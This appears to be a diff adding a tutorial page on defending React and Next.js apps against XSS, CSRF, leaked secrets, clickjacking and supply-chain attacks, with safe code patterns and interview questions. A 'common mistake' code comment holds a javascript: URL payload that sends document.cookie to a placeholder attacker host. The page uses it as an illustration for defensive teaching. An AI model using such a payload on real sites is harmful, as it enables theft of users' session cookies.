@@ -1,0 +1,356 @@
+---
+title: Frontend Security (XSS, CSRF, Secrets)
+summary: Defend React and Next.js apps against XSS, CSRF, leaked secrets, clickjacking and supply-chain attacks with safe defaults and server-side checks.
+category: production
+order: 12
+difficulty: advanced
+tags: [security, xss, csrf, csp, secrets, cookies, supply-chain]
+technologies: [React, Next.js, DOMPurify, Content Security Policy, SameSite cookies, Zod, npm audit]
+updated: 2026-11-09
+---
+
+## What it is
+
+Frontend security is about making sure **attackers can't run code in your users' browsers, act as your users, or read things they shouldn't**. The core rule that ties everything together: **the browser is untrusted territory**. Anything in client code can be read, and anything sent from the client can be forged. Real enforcement (auth, validation, permissions) happens on the server.
+
+| Threat | What happens | Main defenses |
+| --- | --- | --- |
+| **XSS** (cross-site scripting) | Attacker's script runs on your origin and can read data, make requests as the user, steal non-httpOnly tokens | React's escaping, no unsanitized HTML, URL validation, CSP |
+| **CSRF** (cross-site request forgery) | Another site makes the user's browser send an authenticated request to you | SameSite cookies, Origin checks, no state changes on GET |
+| **Leaked secrets** | API keys shipped in the JS bundle | Keep secrets server-only, never `NEXT_PUBLIC_` |
+| **Clickjacking** | Your page is framed invisibly and the user is tricked into clicking | `frame-ancestors` in CSP, `X-Frame-Options` |
+| **Supply chain** | A compromised npm package runs malicious code | Lockfiles, `npm ci`, audits, fewer dependencies |
+
+**What React does for you:** values rendered in JSX (`{userInput}`) are escaped as text, so `<script>` in a comment shows up as literal characters instead of executing. **What it does not do:** sanitize HTML you inject with `dangerouslySetInnerHTML`, validate URLs you put in `href`, protect your API, or hide secrets.
+
+## Common mistake vs correct
+
+<CodeTabs>
+<Tab label="Common mistake">
+
+```tsx
+// ❌ Raw user HTML: any <img onerror=...> runs as your site
+function Comment({ html }: { html: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: html }} />;
+}
+
+// ❌ User-controlled URL: "javascript:fetch('https://evil.example?c='+document.cookie)"
+function ProfileLink({ website }: { website: string }) {
+  return <a href={website}>Website</a>;
+}
+
+// ❌ Secret shipped to every visitor's browser
+const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);
+
+// ❌ Token in localStorage: readable by any script that runs on the page
+localStorage.setItem("accessToken", token);
+
+// ❌ Trusting the client to enforce rules
+if (user.role === "admin") await fetch("/api/users/42", { method: "DELETE" }); // API never re-checks
+```
+
+</Tab>
+<Tab label="Correct">
+
+```tsx
+// ✅ Sanitize HTML with an allowlist before injecting it
+import DOMPurify from "isomorphic-dompurify"; // works in Server and Client Components
+
+function Comment({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code", "pre"],
+    ALLOWED_ATTR: ["href"],
+  });
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+
+// ✅ Only allow safe URL schemes
+function safeUrl(input: string): string | undefined {
+  try {
+    const url = new URL(input);
+    return ["https:", "http:", "mailto:"].includes(url.protocol) ? url.href : undefined;
+  } catch {
+    return undefined; // not an absolute URL
+  }
+}
+
+function ProfileLink({ website }: { website: string }) {
+  const href = safeUrl(website);
+  return href ? <a href={href} rel="noopener noreferrer" target="_blank">Website</a> : null;
+}
+
+// ✅ Secret stays on the server (Route Handler / Server Action / server-only module)
+// lib/stripe.ts
+import "server-only"; // build fails if a Client Component imports this file
+import Stripe from "stripe";
+export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
+```
+
+</Tab>
+<Tab label="Session cookie">
+
+```ts
+// ✅ Session in an httpOnly cookie, set on the server
+// app/api/login/route.ts
+import { cookies } from "next/headers";
+
+export async function POST(request: Request) {
+  const { email, password } = await request.json();
+  const session = await verifyCredentialsAndCreateSession(email, password); // your auth logic
+  if (!session) return Response.json({ message: "Invalid credentials" }, { status: 401 });
+
+  (await cookies()).set("session", session.id, {
+    httpOnly: true, // JavaScript can't read it, so XSS can't exfiltrate it
+    secure: true, // HTTPS only
+    sameSite: "lax", // not sent on cross-site POSTs, blocks classic CSRF
+    path: "/",
+    maxAge: 60 * 60 * 24 * 7,
+  });
+  return Response.json({ ok: true });
+}
+```
+
+</Tab>
+</CodeTabs>
+
+<Callout type="why" title="Why these defaults matter">
+- `dangerouslySetInnerHTML` bypasses React's escaping entirely. DOMPurify parses the HTML and strips scripts, event handler attributes and dangerous URLs, keeping only what you allow.
+- React escapes **text**, but an `href` value is an attribute that the browser **executes** if it starts with `javascript:`. React warns about these URLs (and newer versions are moving to block them), but you should validate the scheme yourself.
+- Every `NEXT_PUBLIC_` variable is inlined into the client bundle at build time. Anyone can open DevTools and read it. Only truly public values (a publishable key, an analytics ID) belong there.
+- An `httpOnly` cookie can't be read by JavaScript, so even a successful XSS attack can't steal the session token (it can still make requests while the page is open, which is why preventing XSS still matters). `SameSite=Lax` stops the browser from attaching the cookie to cross-site form posts and background requests.
+</Callout>
+
+## How to use
+
+1. **Rendering user content**: render as text by default. If you must render HTML (CMS content, rich text, Markdown output), sanitize it with DOMPurify using an allowlist, ideally on the server before storing or rendering.
+
+   ```bash
+   npm i isomorphic-dompurify
+   ```
+
+2. **Validate URLs** from users before putting them in `href`, `src`, `formAction` or `window.location`: parse with `new URL()` and allow only `https:`, `http:` (and `mailto:` if needed).
+
+3. **Keep secrets server-side**: no `NEXT_PUBLIC_` prefix for secrets, `import "server-only"` in modules that use them (`npm i server-only`), and keep `.env*.local` files out of git. If a secret ever reached the client bundle or git history, **rotate it**; deleting the commit is not enough.
+
+4. **Validate every input on the server** with a schema (Zod) and check authentication and authorization in every Route Handler and Server Action. Client-side validation is UX, not security. See [Server Actions](/production/server-actions) and [Authentication](/production/authentication).
+
+5. **Protect against CSRF**: use `SameSite=Lax` or `Strict` cookies, never change state on GET requests, and verify the `Origin` header on state-changing endpoints. Next.js Server Actions are POST-only and compare the `Origin` header to the `Host` by default (configure extra trusted origins with `serverActions.allowedOrigins` if you sit behind proxies). For custom APIs that accept cookies from other origins, add CSRF tokens.
+
+6. **Send security headers** from `next.config.ts`:
+
+   ```ts
+   // next.config.ts
+   import type { NextConfig } from "next";
+
+   const securityHeaders = [
+     { key: "X-Content-Type-Options", value: "nosniff" },
+     { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+     { key: "X-Frame-Options", value: "DENY" }, // legacy clickjacking defense
+     { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
+     { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
+   ];
+
+   const nextConfig: NextConfig = {
+     poweredByHeader: false,
+     async headers() {
+       return [{ source: "/(.*)", headers: securityHeaders }];
+     },
+   };
+
+   export default nextConfig;
+   ```
+
+7. **Add a Content Security Policy** (below), starting in `Content-Security-Policy-Report-Only` mode to find violations before enforcing.
+
+8. **Supply-chain hygiene**: commit the lockfile, use `npm ci` in CI (installs exactly what the lockfile says), run `npm audit` (or `npm audit --omit=dev` to focus on production dependencies) and enable Dependabot or Renovate. Review new dependencies before adding them (maintenance, downloads, what they pull in) and prefer fewer, well-known packages.
+
+## Use-case demos
+
+### Use case 1: sanitized rich text from a CMS or editor
+
+```tsx
+// app/posts/[slug]/page.tsx (Server Component)
+import DOMPurify from "isomorphic-dompurify";
+import { getPost } from "@/lib/posts";
+
+const ALLOWED_TAGS = ["h2", "h3", "p", "a", "ul", "ol", "li", "strong", "em", "blockquote", "code", "pre", "img"];
+const ALLOWED_ATTR = ["href", "src", "alt", "title"];
+
+export default async function PostPage({ params }: { params: Promise<{ slug: string }> }) {
+  const { slug } = await params;
+  const post = await getPost(slug);
+
+  const html = DOMPurify.sanitize(post.bodyHtml, { ALLOWED_TAGS, ALLOWED_ATTR });
+
+  return (
+    <article>
+      <h1>{post.title}</h1> {/* plain text: React escapes it */}
+      <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />
+    </article>
+  );
+}
+```
+
+DOMPurify also removes `javascript:` URLs from `href` and `src` by default. If you render Markdown, configure the Markdown library to disallow raw HTML, or sanitize its output the same way.
+
+### Use case 2: Content Security Policy with nonces in Next.js
+
+```ts
+// middleware.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function middleware(request: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+
+  const csp = `
+    default-src 'self';
+    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
+    style-src 'self' 'nonce-${nonce}';
+    img-src 'self' blob: data:;
+    font-src 'self';
+    connect-src 'self';
+    object-src 'none';
+    base-uri 'self';
+    form-action 'self';
+    frame-ancestors 'none';
+    upgrade-insecure-requests;
+  `.replace(/\s{2,}/g, " ").trim();
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp); // Next.js reads this and adds the nonce to its scripts
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set("Content-Security-Policy", csp);
+  return response;
+}
+
+export const config = {
+  matcher: [
+    // skip static assets and prefetches
+    {
+      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
+      missing: [
+        { type: "header", key: "next-router-prefetch" },
+        { type: "header", key: "purpose", value: "prefetch" },
+      ],
+    },
+  ],
+};
+```
+
+```tsx
+// Reading the nonce for your own third-party scripts
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function Analytics() {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+  return <Script src="https://analytics.example.com/script.js" nonce={nonce} strategy="afterInteractive" />;
+}
+```
+
+A CSP is a **second line of defense**: if an XSS bug slips through, the browser refuses to run inline scripts or scripts from origins you didn't allow. `frame-ancestors 'none'` also blocks clickjacking. Nonces require a fresh value per request, so pages become dynamically rendered; for fully static sites, use a CSP without nonces (with hashes or a looser `script-src`) and accept the trade-off. Third-party tools (analytics, payments, chat widgets) need their domains added to the relevant directives.
+
+### Use case 3: Server Action that doesn't trust the client
+
+```ts
+// app/settings/actions.ts
+"use server";
+
+import { z } from "zod";
+import { revalidatePath } from "next/cache";
+import { getSession } from "@/lib/auth";
+import { db } from "@/lib/db";
+
+const UpdateProfile = z.object({
+  displayName: z.string().trim().min(1).max(50),
+  website: z.string().url().refine((u) => /^https?:\/\//.test(u), "Must be http(s)").optional().or(z.literal("")),
+});
+
+export async function updateProfile(_prev: unknown, formData: FormData) {
+  // 1. Authenticate: Server Actions are public HTTP endpoints, anyone can call them
+  const session = await getSession();
+  if (!session) return { error: "Not signed in" };
+
+  // 2. Validate: never trust the shape or content of formData
+  const parsed = UpdateProfile.safeParse(Object.fromEntries(formData));
+  if (!parsed.success) return { error: "Invalid input", issues: parsed.error.flatten().fieldErrors };
+
+  // 3. Authorize: the user ID comes from the session, NOT from a hidden form field
+  await db.user.update({ where: { id: session.userId }, data: parsed.data });
+
+  revalidatePath("/settings");
+  return { ok: true };
+}
+```
+
+## Pitfalls & when not to use
+
+<Callout type="warn" title="Watch out">
+- **`dangerouslySetInnerHTML` with "trusted" data** is still dangerous if that data originally came from a user (a CMS editor, an imported document, an API that echoes input). Sanitize at render time or at write time, consistently.
+- **Other XSS sinks** outside JSX: `ref.current.innerHTML = ...`, `eval`, `new Function`, `document.write`, `setTimeout` with a string, and injecting JSON into a `script` tag without escaping `<`. Avoid them or escape properly.
+- **Spreading user objects as props** (`<a {...userProvidedProps}>`) lets attackers set `href`, `dangerouslySetInnerHTML` or event-like attributes. Pick the fields you need.
+- **localStorage tokens**: any XSS can read them and send them anywhere. Prefer httpOnly cookies. If you must use bearer tokens in the browser, keep them short-lived and in memory.
+- **Hiding UI is not authorization.** Removing the Delete button for non-admins is UX; the API or Server Action must check permissions itself.
+- **CORS is not CSRF protection.** CORS controls which origins can **read** responses; a cross-site form POST can still be sent. Don't set `Access-Control-Allow-Origin: *` together with credentials (browsers reject it anyway) or reflect any origin.
+- **Environment variables in Client Components**: a variable without `NEXT_PUBLIC_` is `undefined` in the browser, which is the protection working; don't "fix" it by adding the prefix to a secret.
+- **CSP with `'unsafe-inline'` and `'unsafe-eval'`** in `script-src` gives very little XSS protection. Use nonces or hashes.
+- **Install scripts**: npm packages can run code on `npm install`. Be careful with typo-squatted names and consider `--ignore-scripts` for untrusted installs.
+</Callout>
+
+## Interview questions
+
+<QA q="Does React protect you from XSS?" level="junior">
+
+Partly. React escapes values rendered in JSX as text, so a string containing a script tag is displayed, not executed. It does not protect you when you use `dangerouslySetInnerHTML`, put user-controlled URLs in `href` or `src` (`javascript:` URLs), manipulate the DOM directly through refs, or spread user-controlled objects as props. Those cases need sanitization or validation, and a CSP as a backup.
+
+</QA>
+
+<QA q="Why should secrets never use the NEXT_PUBLIC_ prefix?" level="junior">
+
+Next.js inlines every `NEXT_PUBLIC_` variable into the JavaScript bundle at build time, so it is visible to anyone who loads the page. Secrets such as database URLs, private API keys and signing keys must only be read in server code: Server Components, Route Handlers, Server Actions, or modules marked with `import 'server-only'`. If a secret leaked, rotate it immediately.
+
+</QA>
+
+<QA q="Where should you store auth tokens in the browser, and why?" level="mid">
+
+Prefer an `httpOnly`, `Secure`, `SameSite=Lax` (or `Strict`) cookie set by the server. JavaScript can't read it, so an XSS bug can't steal the token, and SameSite limits CSRF. `localStorage` is readable by any script running on the page, including injected ones and compromised third-party scripts. If an architecture requires bearer tokens in the client, keep access tokens short-lived and in memory, with refresh handled by an httpOnly cookie.
+
+</QA>
+
+<QA q="What is CSRF and how do SameSite cookies help?" level="mid">
+
+CSRF is when a malicious site causes the user's browser to send a request to your site, and the browser automatically attaches the user's cookies, so the request is authenticated. `SameSite=Lax` tells the browser not to send the cookie on cross-site subrequests and form POSTs (only on top-level GET navigations), and `Strict` never sends it cross-site. Combine that with no state changes on GET, Origin header checks, and CSRF tokens where cookies must work cross-site. Next.js Server Actions check that the Origin matches the Host by default.
+
+</QA>
+
+<QA q="What is a Content Security Policy and how do you add one in Next.js?" level="mid">
+
+A CSP is an HTTP header that tells the browser which sources of scripts, styles, images, frames and connections are allowed, so injected inline scripts or scripts from unknown domains are blocked even if an XSS bug exists. In Next.js you can set static headers in `next.config.ts` with `headers()`, or generate a per-request nonce in middleware, set it in the `Content-Security-Policy` header, and Next.js applies it to its own scripts. Roll it out with `Content-Security-Policy-Report-Only` first, and include `frame-ancestors 'none'` to block clickjacking.
+
+</QA>
+
+<QA q="A product manager wants users to write posts with rich text formatting. How do you render it safely?" level="senior">
+
+Store the content either as a structured format (editor JSON or Markdown with raw HTML disabled) or as HTML that is sanitized with an allowlist using DOMPurify, ideally on the server. Render structured formats with React components so everything is escaped by default; if you must use `dangerouslySetInnerHTML`, only pass sanitized output and restrict tags and attributes to what the editor produces. Make sure links are limited to http(s) schemes and consider adding `rel` attributes, and deploy a CSP as a safety net in case a sanitizer bypass is found.
+
+</QA>
+
+<QA q="Why must Server Actions validate input and check auth even if the form already does?" level="senior">
+
+A Server Action is exposed as a public POST endpoint, so anyone can call it with arbitrary data using curl or DevTools, bypassing your form and its client-side validation entirely. Each action must authenticate the user from the session, validate input with a schema like Zod, and authorize the operation, for example using the user ID from the session rather than one sent in the form. Hiding a button or a form from some users is not access control.
+
+</QA>
+
+<QA q="What is clickjacking and how do you prevent it?" level="mid">
+
+The attacker loads your page in an invisible `iframe` on their site and overlays it with bait, so the user unknowingly clicks real buttons on your site (like 'delete account' or 'confirm payment') while logged in. Prevent it by forbidding framing with the CSP directive `frame-ancestors 'none'` (or `'self'` if you frame your own pages), plus `X-Frame-Options: DENY` for older browsers. SameSite cookies also reduce the impact because a framed cross-site page may not receive the session cookie.
+
+</QA>
+
+<QA q="How do you reduce supply-chain risk in a frontend project?" level="senior">
+
+Commit the lockfile and install with `npm ci` so builds use exactly the reviewed versions; enable Dependabot or Renovate and run `npm audit` in CI, prioritizing vulnerabilities in production dependencies. Be selective about adding packages: check maintenance, popularity and transitive dependencies, and watch for typo-squatted names. Limit what third-party browser scripts can do with a CSP, and keep secrets out of CI logs and client bundles so a compromised package has less to steal.
+
+</QA>
